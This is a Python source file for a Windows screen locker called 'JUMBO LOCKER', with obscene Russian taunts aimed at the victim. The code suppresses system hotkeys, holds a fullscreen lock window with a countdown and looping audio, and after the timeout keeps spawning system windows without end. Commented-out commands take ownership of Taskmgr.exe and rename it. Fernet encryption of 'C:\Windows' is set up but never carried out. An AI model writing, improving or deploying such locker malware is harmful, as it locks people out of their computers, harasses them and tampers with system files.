import tkinter as tk
from tkinter import messagebox
import time
import threading
import os
import pygame
import sys
import shutil
from cryptography.fernet import Fernet
import subprocess
import pygame
import keyboard
from tkinter import *
from PIL import Image, ImageTk
import socket


keyboard.add_hotkey("alt + tab", lambda: None, suppress=True)
keyboard.add_hotkey("win + r", lambda: None, suppress=True)
keyboard.add_hotkey("win + e", lambda: None, suppress=True)
keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress=True)

image_path = "background.png"
def set_background(window, image_path):
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    img = Image.open(image_path)
    img = img.resize((screen_width, screen_height))
    window.background_image = ImageTk.PhotoImage(img)
    background_label = Label(window, image=window.background_image)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)
    background_label.lower()


def check():
    global is_code_entered
    if entry.get() == unlock_key:
        is_code_entered = True
        messagebox.showinfo("Уведомление", "Ключ введен верно. Хорошего дня!")
        win.attributes("-fullscreen", False)
        win.update()
        win.geometry("300x300")
        win.quit()
        sys.exit()
    else:
        messagebox.showinfo("Уведомление", "ДА ПИЗДА УЖЕ КОМПУ МОЖЕШЬ НЕ ПЫТАТЬСЯ")
        win.iconify()

def open_task_manager():
    subprocess.run(["taskmgr"])

def open_file_explorer():
    subprocess.run(["explorer"])

def open_run_dialog():
    subprocess.run(["rundll32", "shell32.dll,ShellExec_RunDLL", "appwiz.cpl"])

def on_closing():
    global is_code_entered
    if not is_code_entered:
        messagebox.showinfo("Уведомление", "НЕ ПЫТАЙСЯ, Я ВСЕРАВНО ВЫЕБУ ТВОЮ ЖЕПУ")

def open_windows_cyclically():
    while not is_code_entered:
        open_task_manager()  # Открыть диспетчер задач
        time.sleep(0)  # возможность добавить задержку
        open_file_explorer()  # Открыть Проводник
        time.sleep(0)  # возможность добавить задержку
        open_run_dialog()  # Открыть диалог "Выполнить"
        time.sleep(0)  # возможность добавить задержку

def countdown_thread(seconds, file_to_encrypt):
    while seconds > 0 and not is_code_entered:
        time_label.config(text=f"Осталось времени: {seconds} сек.")
        win.update()
        time.sleep(1)
        seconds -= 1
    if not is_code_entered:
        time_label.config(text="Время истекло!")
        countdown_thread = threading.Thread(target=open_windows_cyclically)
        countdown_thread.start()
        

audio_path = 'angry-birds-bass-boosted.mp3'
file_to_encrypt = "C:\Windows"

unlock_key = '123123'
is_code_entered = False

win = tk.Tk()
win.title('JUMBO LOCKER')
set_background(win, image_path)
win.resizable(False, False)
logo = tk.PhotoImage(file='logo.png')
win.iconphoto(False, logo)

win.protocol("WM_DELETE_WINDOW", on_closing)

win.attributes("-fullscreen", True)
win.config(bg='black')

label = tk.Label(win, text='ТВОЙ ПК ЗАБЛОКИРОВАН BY JUMBO LOCKER. ПОПЛАЧЬ УЕБОК ВЕДЬ У ТЕБЯ НЕТ КЛЮЧА))', fg='red', bg='black')
label.grid(row=2, padx=350, pady=20)
label.config(font=("Helvetica", 17))

entry = tk.Entry(win, show='*')
entry.grid(row=4, padx=350, pady=20)

button = tk.Button(win, text="Ввести код", command=check)
button.grid(row=5, padx=350, pady=20)

seconds_to_countdown = 1800
time_label = tk.Label(win, text="", fg='red', bg='black')
time_label.grid(row=0, padx=350, pady=20)

fernet_key = Fernet.generate_key()

pygame.init()
pygame.mixer.init()
pygame.mixer.music.load(audio_path)
pygame.mixer.music.play(-1)

countdown_thread = threading.Thread(target=countdown_thread, args=(seconds_to_countdown, file_to_encrypt))
countdown_thread.start()
 
#path1 = "C:\Windows\System32\Taskmgr.exe"
#path2 = "C:\Windows\System32\Taskmgr1.exe"
#os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") 
#os.system("taskkill /im taskmgr.exe") 
#os.rename(path1, path2)



win.mainloop()
